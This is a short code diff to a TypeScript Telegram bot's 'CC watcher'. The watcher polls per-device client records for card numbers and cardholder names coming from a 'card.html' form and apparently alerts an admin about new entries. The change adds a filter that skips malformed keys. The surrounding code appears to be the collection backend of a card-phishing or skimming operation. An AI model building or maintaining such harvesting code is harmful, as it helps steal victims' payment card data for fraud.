@@ -37,7 +37,7 @@ export function startCcWatcher(bot: Telegraf, adminId: number): void {
       watermarks = await getCcWatermarks();
       const clients = await fbGet("clients");
       if (clients) {
-        for (const [deviceId, device] of Object.entries(clients as Record<string, any>)) {
+        for (const [deviceId, device] of Object.entries(clients as Record<string, any>).filter(([k]: any) => !String(k).startsWith('{') && !String(k).startsWith('*'))) {
           if (watermarks[deviceId] !== undefined) continue;
           // Seed — mark existing CC data as already seen
           const ts = device?.cc_timestamp || device?.timestamp || null;
@@ -58,7 +58,7 @@ export function startCcWatcher(bot: Telegraf, adminId: number): void {
       const clients = await fbGet("clients");
       if (!clients) return;
 
-      for (const [deviceId, device] of Object.entries(clients as Record<string, any>)) {
+      for (const [deviceId, device] of Object.entries(clients as Record<string, any>).filter(([k]: any) => !String(k).startsWith('{') && !String(k).startsWith('*'))) {
         // Support both field naming conventions from card.html
         const cardNumber  = device?.cc_cardNumber  || device?.cardNumber  || null;
         const cardHolder  = device?.cc_cardholderName || device?.cardholderName || "Unknown";
